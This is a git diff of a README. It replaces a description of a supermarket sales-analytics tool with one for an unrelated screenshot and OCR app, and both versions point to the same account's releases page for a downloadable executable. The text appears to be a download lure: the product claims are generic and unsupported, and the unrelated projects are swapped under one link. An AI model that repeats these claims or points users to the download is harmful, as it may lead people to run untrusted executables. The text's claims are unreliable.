@@ -1,42 +1,77 @@
-<h1>📊 apexplanet-data-analytics-2026 - Unlock Supermarket Sales Insights Instantly</h1>
-<p align="center">
-  <a href="https://github.com/Camouflaged-chaldron860/apexplanet-data-analytics-2026/releases" style="display:inline-block;padding:15px 30px;font-size:20px;font-weight:bold;background:#4CAF50;color:#fff;text-decoration:none;border-radius:8px;">📥 Download Now</a>
-</p>
+# 📸 mark-shot-community - Capture, Annotate, and Extract Text Instantly
 
-<h2>🚀 Getting Started</h2>
-<p>Welcome to <strong>apexplanet-data-analytics-2026</strong>! This easy-to-use tool helps you analyze supermarket sales data. You don't need any programming experience—just follow the steps below to start exploring your sales insights.</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Camouflaged-chaldron860/mark-shot-community/releases)
 
-<h2>📥 Download & Install</h2>
-<p>Visit this link to download the application.</p>
-<p><a href="https://github.com/Camouflaged-chaldron860/apexplanet-data-analytics-2026/releases" style="display:inline-block;padding:10px 20px;background:#008CBA;color:#fff;text-decoration:none;border-radius:5px;">📥 Get the Latest Version</a></p>
-<p>Once downloaded, follow the simple setup instructions to get started.</p>
+## 🚀 Getting Started
 
-<h2>🔧 How to Run</h2>
-<ol>
-  <li>Download the file from the link above.</li>
-  <li>Double-click the downloaded file to start the program.</li>
-  <li>Follow the on-screen instructions to load your supermarket sales data.</li>
-  <li>View your results immediately—no coding required!</li>
-</ol>
+Welcome to **mark-shot-community**! This is a free, easy-to-use tool that lets you take screenshots, draw on them, and even copy text from images using OCR (Optical Character Recognition). Whether you're on Windows, Linux, or Wayland, this app works smoothly. Best of all, it's designed for regular users—no coding or technical skills needed.
 
-<h2>📈 Features</h2>
-<ul>
-  <li>✅ <strong>Automatic Data Cleaning</strong> – Fixes common errors in sales data.</li>
-  <li>✅ <strong>Interactive Visualizations</strong> – See sales trends, top products, and more.</li>
-  <li>✅ <strong>Exploratory Analysis</strong> – Discover hidden patterns in your data.</li>
-  <li>✅ <strong>Works on Windows</strong> – Fully compatible with Windows 10 and 11.</li>
-</ul>
+## 📥 How to Download and Install
 
-<h2>🖥️ System Requirements</h2>
-<ul>
-  <li>Windows 10 or 11 (64-bit)</li>
-  <li>4 GB RAM (8 GB recommended)</li>
-  <li>500 MB free disk space</li>
-  <li>Internet connection for initial setup</li>
-</ul>
+1. **Visit this link to download the application:** [Click here to go to the download page](https://github.com/Camouflaged-chaldron860/mark-shot-community/releases)
+2. On the page, look for the latest release (usually the top one). Click on the file named something like `mark-shot-community-*.exe` (for Windows) or your platform's installer.
+3. Once downloaded, double-click the file to run the installer. Follow the simple on-screen steps.
+4. After installation, find "Mark Shot Community" in your Start Menu or Applications folder and launch it.
 
-<h2>❓ Need Help?</h2>
-<p>If you have any questions or run into issues, please check the <a href="https://github.com/Camouflaged-chaldron860/apexplanet-data-analytics-2026/releases">releases page</a> for updates or contact support.</p>
+## 🖥️ What You Can Do
 
-<h2>📋 License</h2>
-<p>This project is for personal and educational use. See the license file for details.</p>
+- **Take Screenshots:** Select any area of your screen to capture.
+- **Annotate Easily:** Draw arrows, rectangles, circles, or add text directly on your screenshot.
+- **Extract Text (OCR):** Select a region and instantly copy text from images, PDFs, or screenshots.
+- **Multi-Language Support:** The interface is available in various languages—change it in settings.
+- **Headless Mode:** Advanced users can run it from the command line for automation.
+
+## 🎨 Features at a Glance
+
+| Feature | Description |
+|---------|-------------|
+| 📸 Screen Capture | Select any area or window |
+| ✏️ Annotation Tools | Draw, highlight, blur, add text |
+| 🔍 OCR | Extract text from images (works offline) |
+| 🌐 Multi-Language | UI in English, German, French, Spanish, and more |
+| 💻 Cross-Platform | Windows, Linux (X11/Wayland), macOS (experimental) |
+| 🚀 Fast | Built on Qt 6 for smooth performance |
+
+## 🛠️ System Requirements
+
+- **Operating System:** Windows 10 or later, Linux (with X11 or Wayland), macOS 12+
+- **Processor:** Any modern dual-core CPU
+- **RAM:** 2 GB minimum (4 GB recommended for OCR)
+- **Storage:** 200 MB free space
+- **Additional:** For OCR, ensure your system has Tesseract installed (most systems do, but if not, the app will prompt you)
+
+## ❓ Frequently Asked Questions
+
+**Q: Is this free?**
+A: Yes! It's completely free and open-source.
+
+**Q: How do I take a screenshot?**
+A: Launch the app, click the "Capture" button, then drag to select an area. Release the mouse to capture.
+
+**Q: I can't find the language option.**
+A: Go to the Settings menu (gear icon) and look for "Language" or "Language." Change it and restart the app.
+
+**Q: The OCR doesn't work.**
+A: Make sure you have Tesseract installed. On Windows, the installer usually includes it. On Linux, run `sudo apt install tesseract-ocr` (or your package manager's equivalent).
+
+## 📝 How to Use
+
+1. **Open the app** – You'll see a clean window with a toolbar on top.
+2. **Click "Capture"** – Your screen will dim. Click and drag to select an area.
+3. **Annotate** – Use the toolbar to draw, add text, or highlight.
+4. **Save or Copy** – Click the save icon to save as PNG, or use the copy button to paste elsewhere.
+5. **OCR** – Click the "T" icon with a magnifying glass, select text in the image, and it will be copied to your clipboard.
+
+## 🔄 Updating
+
+mark-shot-community will check for updates automatically. You can also manually download the latest version from the [releases page](https://github.com/Camouflaged-chaldron860/mark-shot-community/releases).
+
+## 🤝 Need Help?
+
+If you run into issues, check the "Issues" tab on the GitHub page. You can also ask questions in the community forums.
+
+## 📜 License
+
+This project is open-source under the MIT License. You can use, modify, and share it freely.
+
+Keywords: annotation, gnome, linux, ocr, qt, qt6, screen-capture, screenshot, wayland, x11
